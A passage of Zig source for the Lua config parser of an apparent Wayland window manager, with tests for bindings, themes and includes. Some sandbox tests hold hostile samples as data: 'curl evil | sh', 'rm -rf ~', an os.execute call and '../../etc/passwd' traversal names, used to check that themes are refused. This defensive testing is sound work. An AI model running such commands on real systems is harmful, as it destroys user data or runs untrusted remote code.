/// or a table that already is the argv ({ "foot", "-e", "htop -d 5" }).
fn commandValue(ctx: *Ctx) ParseError![]const []const u8 {
    const L = ctx.L;
    const a = ctx.a;
    if (lua.toSlice(L, -1)) |s| {
        return parseCommand(a, s) catch |e| return mapCmdErr(e);
    }
    if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
    const n = lua.rawLen(L, -1);
    if (n == 0 or n > 256) return error.Invalid;
    var args: std.ArrayList([]const u8) = .empty;
    var i: usize = 1;
    while (i <= n) : (i += 1) {
        lua.rawGetI(L, -1, @intCast(i));
        const s = lua.toSlice(L, -1) orelse {
            lua.pop(L, 1);
            return error.Invalid;
        };
        const copy = try a.dupe(u8, s);
        lua.pop(L, 1);
        try args.append(a, copy);
    }
    if (args.items[0].len == 0) return error.Invalid;
    return args.toOwnedSlice(a);
}

fn mapCmdErr(e: anyerror) ParseError {
    return if (e == error.OutOfMemory) error.OutOfMemory else error.Invalid;
}

/// A Pango font description: not empty, not longer than `max_font_len`, no
/// control characters. (Whether the family exists is Pango's business: an
/// unknown family falls back to the default font.) Lives in `a`.
fn parseFont(a: std.mem.Allocator, value: []const u8) ParseError![:0]const u8 {
    if (!validFont(value)) return error.Invalid;
    return a.dupeZ(u8, value) catch error.OutOfMemory;
}

pub fn validFont(s: []const u8) bool {
    if (s.len == 0 or s.len > max_font_len) return false;
    for (s) |ch| if (ch < 0x20 or ch == 0x7f) return false;
    return true;
}

/// Split a command line into argv. Supports "double quoted" arguments.
/// The returned slice and its strings live in `a`.
pub fn parseCommand(a: std.mem.Allocator, s: []const u8) ![]const []const u8 {
    var args: std.ArrayList([]const u8) = .empty;
    var i: usize = 0;
    while (i < s.len) {
        while (i < s.len and (s[i] == ' ' or s[i] == '\t')) i += 1;
        if (i >= s.len) break;

        if (s[i] == '"') {
            i += 1;
            const start = i;
            while (i < s.len and s[i] != '"') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
            if (i < s.len) i += 1;
        } else {
            const start = i;
            while (i < s.len and s[i] != ' ' and s[i] != '\t') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
        }
    }
    if (args.items.len == 0) return error.Invalid;
    return args.toOwnedSlice(a);
}

// ----------------------------------------------------------------------------
// Key bindings
// ----------------------------------------------------------------------------

pub fn parseMods(s: []const u8) ?Modifiers {
    var mods: Modifiers = .{};
    var it = std.mem.tokenizeScalar(u8, s, '+');
    var any = false;
    while (it.next()) |tok| {
        const t = std.mem.trim(u8, tok, " \t");
        if (t.len == 0) continue;
        any = true;
        if (eqlNoCase(t, "super") or eqlNoCase(t, "mod4") or eqlNoCase(t, "logo")) {
            mods.mod4 = true;
        } else if (eqlNoCase(t, "shift")) {
            mods.shift = true;
        } else if (eqlNoCase(t, "ctrl") or eqlNoCase(t, "control")) {
            mods.ctrl = true;
        } else if (eqlNoCase(t, "alt") or eqlNoCase(t, "mod1")) {
            mods.mod1 = true;
        } else if (eqlNoCase(t, "mod3")) {
            mods.mod3 = true;
        } else if (eqlNoCase(t, "mod5") or eqlNoCase(t, "altgr")) {
            mods.mod5 = true;
        } else return null;
    }
    return if (any) mods else null;
}

fn eqlNoCase(a: []const u8, b: []const u8) bool {
    return std.ascii.eqlIgnoreCase(a, b);
}

pub fn modsBits(m: Modifiers) u32 {
    return @intCast(@as(std.meta.Int(.unsigned, @bitSizeOf(Modifiers)), @bitCast(m)));
}

/// bind("Super+Shift+h", "close")  ->  Bind
fn addBind(
    a: std.mem.Allocator,
    binds: *std.ArrayList(Bind),
    combo_text: []const u8,
    command_text: []const u8,
) error{ Invalid, OutOfMemory }!void {
    const combo = std.mem.trim(u8, combo_text, " \t");
    const command = std.mem.trim(u8, command_text, " \t");
    if (command.len == 0) return error.Invalid;

    const parsed = parseCombo(a, combo) orelse return error.Invalid;

    // A later bind for the same combo replaces the earlier one.
    removeBindExact(binds, parsed.mods, parsed.keysym);
    try binds.append(a, .{
        .mods = parsed.mods,
        .keysym = parsed.keysym,
        .command = try a.dupe(u8, command),
    });
}

fn removeBind(binds: *std.ArrayList(Bind), combo_text: []const u8) error{Invalid}!void {
    var buf: [256]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    const parsed = parseCombo(fba.allocator(), combo_text) orelse return error.Invalid;
    removeBindExact(binds, parsed.mods, parsed.keysym);
}

fn removeBindExact(binds: *std.ArrayList(Bind), mods: Modifiers, keysym: u32) void {
    var i: usize = 0;
    while (i < binds.items.len) {
        const b = binds.items[i];
        if (b.keysym == keysym and modsBits(b.mods) == modsBits(mods)) {
            _ = binds.orderedRemove(i);
        } else i += 1;
    }
}

const Combo = struct { mods: Modifiers, keysym: u32 };

/// "Super+Shift+Return" -> modifiers + keysym. The last `+`-separated
/// token is the key; everything before it is a modifier.
fn parseCombo(a: std.mem.Allocator, s: []const u8) ?Combo {
    var mods: Modifiers = .{};
    var key_name: []const u8 = std.mem.trim(u8, s, " \t");

    if (std.mem.lastIndexOfScalar(u8, key_name, '+')) |i| {
        if (i == key_name.len - 1 and i > 0 and key_name[i - 1] == '+') {
            // "Super++": the key is a literal plus sign.
            mods = parseMods(key_name[0 .. i - 1]) orelse return null;
            key_name = "plus";
        } else {
            mods = parseMods(key_name[0..i]) orelse return null;
            key_name = std.mem.trim(u8, key_name[i + 1 ..], " \t");
        }
    }
    if (key_name.len == 0) return null;

    const z = a.dupeZ(u8, key_name) catch return null;
    var sym = xkb.Keysym.fromName(z, .no_flags);
    if (sym == .NoSymbol) sym = xkb.Keysym.fromName(z, .case_insensitive);
    if (sym == .NoSymbol) {
        // One character, written as itself: ü, ß, ä, é ...
        const cp = singleCodepoint(key_name) orelse return null;
        const ks = xkb_utf32_to_keysym(cp);
        if (ks == 0) return null; // XKB_KEY_NoSymbol
        return .{ .mods = mods, .keysym = ks };
    }
    return .{ .mods = mods, .keysym = @intFromEnum(sym) };
}

extern fn xkb_utf32_to_keysym(ucs: u32) u32;

/// The code point of `s` if it is exactly one UTF-8 encoded character.
fn singleCodepoint(s: []const u8) ?u21 {
    if (s.len == 0) return null;
    const n = std.unicode.utf8ByteSequenceLength(s[0]) catch return null;
    if (n != s.len) return null;
    return std.unicode.utf8Decode(s) catch null;
}

// ----------------------------------------------------------------------------
// Tests
// ----------------------------------------------------------------------------

fn parseText(arena: std.mem.Allocator, cfg: *Config, text: []const u8) !void {
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena, text, cfg, &binds, "<test>");
}

test "colours can be strings (with or without #, or 0x) or plain numbers" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\border_focused = "#112233"
        \\border_unfocused = "445566"
        \\border_floating = 0x778899
    );
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
    try std.testing.expectEqual(@as(u32, 0x445566), cfg.border_unfocused);
    try std.testing.expectEqual(@as(u32, 0x778899), cfg.border_floating);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);

    try parseText(arena.allocator(), &cfg,
        \\border_focused = "#12345g"
        \\border_unfocused = -1
        \\border_floating = true
    );
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused); // refused: unchanged
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
}

test "enable_autostart parses and defaults on" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.enable_autostart);

    try parseText(arena.allocator(), &cfg, "enable_autostart = false\n");
    try std.testing.expect(!cfg.enable_autostart);
}

test "command splitting" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const argv = try parseCommand(arena.allocator(), "foot -e \"htop -d 5\"");
    try std.testing.expectEqual(@as(usize, 3), argv.len);
    try std.testing.expectEqualStrings("htop -d 5", argv[2]);
}

test "a program is a string to split or a table that already is the argv" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\terminal = "foot -e \"htop -d 5\""
        \\launcher = { "wofi", "--show", "drun" }
        \\browser = {}
    );
    try std.testing.expectEqual(@as(usize, 3), cfg.terminal.len);
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqualStrings("htop -d 5", cfg.terminal[2]);
    try std.testing.expectEqual(@as(usize, 3), cfg.launcher.len);
    try std.testing.expectEqualStrings("drun", cfg.launcher[2]);
    // An empty table is refused: the default stays.
    try std.testing.expectEqualStrings("firefox", cfg.browser[0]);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "dock and clip options parse, bad values are rejected" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);

    // A name is one variable: the last assignment is the one that counts,
    // so the bad values come in separate runs.
    try parseText(arena.allocator(), &cfg,
        \\dock_edge = "left"
        \\dock_offset = 120
        \\dock_on_top = false
        \\dock_reserve_space = false
        \\clip_corner = "bottom_right"
        \\clip_collapsed = true
        \\clip_enabled = false
        \\workspace_names = { "Main", "", "Web" }
    );
    try parseText(arena.allocator(), &cfg,
        \\clip_corner = "middle"
        \\dock_offset = -4
    );
    try std.testing.expectEqual(DockEdge.left, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 120), cfg.dock_offset);
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_reserve_space);
    // The two bad values of the second run changed nothing.
    try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
    try std.testing.expect(cfg.clip_collapsed);
    try std.testing.expect(!cfg.clip_enabled);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 3), cfg.workspace_names.len);
    try std.testing.expectEqualStrings("Main", cfg.workspace_names[0]);
    try std.testing.expectEqualStrings("", cfg.workspace_names[1]);
    try std.testing.expectEqualStrings("Web", cfg.workspace_names[2]);
}

test "dock_size: 16..256 is accepted, anything else is a warning and changes nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expectEqual(@as(i32, 64), cfg.dock_size);

    try parseText(arena.allocator(), &cfg, "dock_size = 96\n");
    try std.testing.expectEqual(@as(i32, 96), cfg.dock_size);
    try parseText(arena.allocator(), &cfg, "dock_size = 8\n");
    try parseText(arena.allocator(), &cfg, "dock_size = 300\n");
    try parseText(arena.allocator(), &cfg, "dock_size = \"big\"\n");
    try std.testing.expectEqual(@as(i32, 96), cfg.dock_size);
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
}

test "the built-in default config has the documented Dock and Clip defaults" {
    // Parse the built-in text itself: config.load() would also read the
    // developer's own config.lua and the test would depend on it.
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expect(binds.items.len > 40);
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 0), cfg.dock_offset);
    try std.testing.expectEqual(@as(i32, 64), cfg.dock_size);
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(cfg.dock_reserve_space);
    try std.testing.expect(cfg.clip_enabled);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);
    try std.testing.expect(cfg.clip_on_top);
    try std.testing.expect(!cfg.clip_collapsed);
    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
}

test "bind_layout: current, a layout number, and nonsense" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();

    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = 1\n");
    try std.testing.expectEqual(@as(?u32, 1), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = \"current\"\n");
    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = 0\n");
    try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
    for ([_][]const u8{ "bind_layout = 9", "bind_layout = -1", "bind_layout = \"de\"" }) |bad| {
        const before = cfg.parse_warnings;
        try parseText(arena.allocator(), &cfg, bad);
        // Refused: the 0 stays.
        try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
        try std.testing.expectEqual(before + 1, cfg.parse_warnings);
    }
}

test "keys can be named by the character itself (German umlauts, sharp s)" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    const ue = parseCombo(a, "Super+ü").?;
    const by_name = parseCombo(a, "Super+udiaeresis").?;
    try std.testing.expectEqual(by_name.keysym, ue.keysym);
    try std.testing.expect(ue.mods.mod4);

    try std.testing.expect(parseCombo(a, "ss") == null); // not a keysym, and not one character
    try std.testing.expectEqual(parseCombo(a, "ssharp").?.keysym, parseCombo(a, "ß").?.keysym);
    try std.testing.expectEqual(parseCombo(a, "adiaeresis").?.keysym, parseCombo(a, "Alt+ä").?.keysym);
    // Plain ASCII still goes through the name lookup.
    try std.testing.expectEqual(parseCombo(a, "q").?.keysym, parseCombo(a, "Super+q").?.keysym);

    // Not a key: several characters, or nothing sensible.
    try std.testing.expect(parseCombo(a, "Super+üü") == null);
    try std.testing.expect(parseCombo(a, "Super+") == null);
}

test "a bind with an umlaut key is accepted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "bind(\"Super+ö\", \"close\")\nbind(\"Super+Shift+Ü\", \"exit\")\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(usize, 2), binds.items.len);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

// ---- the script itself -------------------------------------------------------

test "bind and unbind keep their order, and a loop can make binds" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\for i = 1, 3 do bind("Super+" .. i, "workspace " .. i) end
        \\bind("Super+2", "close")      -- replaces the workspace bind of Super+2
        \\unbind("Super+3")
        \\bind("Super+Return", [[shell notify-send "$(date)" && true]])
    , &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 3), binds.items.len);
    try std.testing.expectEqualStrings("workspace 1", binds.items[0].command);
    try std.testing.expectEqualStrings("close", binds.items[1].command);
    try std.testing.expectEqualStrings("shell notify-send \"$(date)\" && true", binds.items[2].command);
}

test "bad binds are warnings and change nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\bind("Super+Nonsensekey", "close")
        \\bind("Super+x")
        \\bind("Super+y", "")
        \\bind(5, 6)
        \\unbind("Hyper+")
    , &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(usize, 0), binds.items.len);
    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
}

test "the script can compute and read the environment" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\local base = 4
        \\gap = base * 2 + 1
        \\terminal = os.getenv("WMAKER_WL_SURELY_NOT_SET") or "foot"
    );
    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "a Lua error ends the script there: what ran before stays, one warning" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = 3
        \\error("boom")
        \\outer_gap = 4
    );
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(i32, 8), cfg.outer_gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "a syntax error is one warning and changes nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = = 3\n");
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "unknown options are reported (typos), helpers are not" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\local x = 5       -- local: not an option
        \\_helper = 1       -- starts with _: not an option
        \\gapp = 8          -- a typo
        \\dock_level = "top"
    );
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
}

test "values of the wrong type are refused, not converted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = "12"
        \\workspace_count = 3.5
        \\focus_follows_mouse = "yes"
        \\new_window = 3
        \\width_presets = 0.5
        \\workspace_names = "Main, Web"
    );
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
    try std.testing.expect(!cfg.focus_follows_mouse);
    try std.testing.expectEqual(NewWindowMode.new_column, cfg.new_window);
    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
    try std.testing.expectEqual(@as(u32, 6), cfg.parse_warnings);
}

test "os.exit and io.read are not available to a config" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    // Both are nil now: calling them is an ordinary Lua error (one warning),
    // not the end of the process or a read that never returns.
    try parseText(arena.allocator(), &cfg, "gap = 3\nos.exit(0)\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try parseText(arena.allocator(), &cfg, "local x = io.read()\n");
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
    // The rest of both libraries is still there.
    try parseText(arena.allocator(), &cfg, "gap = #os.date() > 0 and 4 or 5\n");
    try std.testing.expectEqual(@as(i32, 4), cfg.gap);
}

test "a UTF-8 byte order mark at the start of the file is skipped" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "\xEF\xBB\xBFgap = 3\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "an endless loop is aborted instead of hanging the session" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = 3\nwhile true do end\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

// ----------------------------------------------------------------------------
// include / theme
// ----------------------------------------------------------------------------

/// An in-memory file system for the tests: path -> contents.
const FakeFiles = struct {
    paths: []const []const u8,
    texts: []const []const u8,
    reads: usize = 0,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FakeFiles = @ptrCast(@alignCast(ctx));
        self.reads += 1;
        for (self.paths, 0..) |p, i| {
            if (std.mem.eql(u8, p, path)) return a.dupe(u8, self.texts[i]) catch null;
        }
        return null;
    }

    fn includer(self: *FakeFiles, dir: []const u8) Includer {
        return .{ .ctx = self, .read = read, .dir = dir };
    }
};

fn parseFake(files: *FakeFiles, main_text: []const u8, cfg: *Config) !void {
    var binds: std.ArrayList(Bind) = .empty;
    const inc = files.includer("/cfg");
    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.lua", &inc, false);
    cfg.binds = try binds.toOwnedSlice(cfg.arena.allocator());
}

test "include runs another file in place: later lines override it, earlier ones are overridden" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{ "/cfg/look.lua", "/abs/other.lua" },
        .texts = &.{ "gap = 20\nouter_gap = 21\nbind(\"Super+x\", \"close\")\n", "border_width = 6\n" },
    };
    try parseFake(&files, "gap = 1\ninclude(\"look.lua\")\nouter_gap = 5\ninclude(\"/abs/other.lua\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 20), cfg.gap); // the include came after `gap = 1`
    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap); // the main file came after the include
    try std.testing.expectEqual(@as(i32, 6), cfg.border_width);
    try std.testing.expectEqual(@as(usize, 1), cfg.binds.len); // an include may bind keys: it is the user's own
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "include problems are warnings, never failures: missing, empty, too deep" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/self.lua"},
        .texts = &.{"include(\"self.lua\")\ngap = 3\n"},
    };
    try parseFake(&files, "include(\"nope.lua\")\ninclude(\"\")\ninclude(\"self.lua\")\nborder_width = 4\n", &cfg);
    // The main file kept going, and the self-including file stopped at the limit.
    try std.testing.expectEqual(@as(i32, 4), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expect(cfg.parse_warnings >= 3);
    // Bounded: not an endless read loop.
    try std.testing.expect(files.reads <= max_include_depth + 2);
}

test "without an Includer, include and theme are refused" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "include(\"x.lua\")\ntheme(\"nord\")\ngap = 9\n");
    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme sets look options; anything else in it is ignored" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/odd.lua"},
        .texts = &.{
            \\border_focused = "#112233"
            \\gap = 2
            \\terminal = "sh -c \"curl evil | sh\""
            \\workspace_count = 9
        },
    };
    try parseFake(&files, "terminal = \"foot\"\ntheme(\"odd\")\n", &cfg);
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
    try std.testing.expectEqual(@as(i32, 2), cfg.gap);
    // The two lines that are not look options did nothing.
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme runs with an empty environment: it cannot call anything" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{ "/cfg/Themes/evil.lua", "/cfg/Themes/evil2.lua" },
        .texts = &.{
            \\gap = 2
            \\bind("Super+Return", "shell rm -rf ~")
            ,
            \\gap = 2
            \\os.execute("touch /tmp/pwned")
        },
    };
    try parseFake(&files, "theme(\"evil\")\ntheme(\"evil2\")\n", &cfg);
    // Both failed (nil is not callable), and a failed theme is dropped as a
    // whole: not even its `gap = 2` applies.
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme and the lines around it: later lines win, earlier ones are overridden" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/t.lua"},
        .texts = &.{"gap = 20\nouter_gap = 21\n"},
    };
    try parseFake(&files, "gap = 1\ntheme(\"t\")\nouter_gap = 5\n", &cfg);
    try std.testing.expectEqual(@as(i32, 20), cfg.gap);
    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "theme names are file names, never paths" {
    try std.testing.expect(validThemeName("nord"));
    try std.testing.expect(validThemeName("my-theme_2.v1"));
    try std.testing.expect(!validThemeName(""));
    try std.testing.expect(!validThemeName("../etc/passwd"));
    try std.testing.expect(!validThemeName("a/b"));
    try std.testing.expect(!validThemeName(".hidden"));
    try std.testing.expect(!validThemeName("a..b"));
    try std.testing.expect(!validThemeName("with space"));
    try std.testing.expect(!validThemeName("x" ** 65));

    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.lua"}, .texts = &.{"gap = 99\n"} };
    try parseFake(&files, "theme(\"../../etc/passwd\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 0), files.reads); // refused before any read
}

test "a missing theme is a warning and the defaults stay" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
    try parseFake(&files, "theme(\"nonexistent\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "the shipped themes are valid themes and the shipped config has no warnings" {
    const themes = [_]struct { name: []const u8, text: []const u8 }{
        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.lua") },
        .{ .name = "nord", .text = @embedFile("share/Themes/nord.lua") },
        .{ .name = "next", .text = @embedFile("share/Themes/next.lua") },
    };
    for (themes) |t| {
        var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
        defer arena.deinit();
        var cfg: Config = .{ .arena = .init(std.testing.allocator) };
        defer cfg.deinit();
        var binds: std.ArrayList(Bind) = .empty;
        try parseWith(arena.allocator(), t.text, &cfg, &binds, t.name, null, true);
        try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
        try std.testing.expect(cfg.border_width >= 1);
    }

    // gruvbox is the built-in look: it must equal the defaults, or the
    // "built-in" claim in its header is a lie.
    var def: Config = .{ .arena = .init(std.testing.allocator) };
    defer def.deinit();
    var gb: Config = .{ .arena = .init(std.testing.allocator) };
    defer gb.deinit();
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var b1: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &def, &b1, "<built-in>");
    var b2: std.ArrayList(Bind) = .empty;
    try parseWith(arena.allocator(), themes[0].text, &gb, &b2, "gruvbox", null, true);
    try std.testing.expectEqual(def.border_focused, gb.border_focused);
    try std.testing.expectEqual(def.border_unfocused, gb.border_unfocused);
    try std.testing.expectEqual(def.border_floating, gb.border_floating);
    try std.testing.expectEqual(def.border_width, gb.border_width);
    try std.testing.expectEqual(def.gap, gb.gap);
    try std.testing.expectEqual(def.outer_gap, gb.outer_gap);

    // The built-in default config parses without a single warning.
    try std.testing.expectEqual(@as(u32, 0), def.parse_warnings);
}

test "fonts and the focus/wrap/scroll switches are parsed" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\font_menu_title = "Serif Bold 12"
        \\font_menu = ""
        \\font_dock = "Sans 7"
        \\focus_new_windows = false
        \\workspace_wrap = false
        \\clip_scroll_workspaces = false
    );
    try std.testing.expectEqualStrings("Serif Bold 12", cfg.font_menu_title);
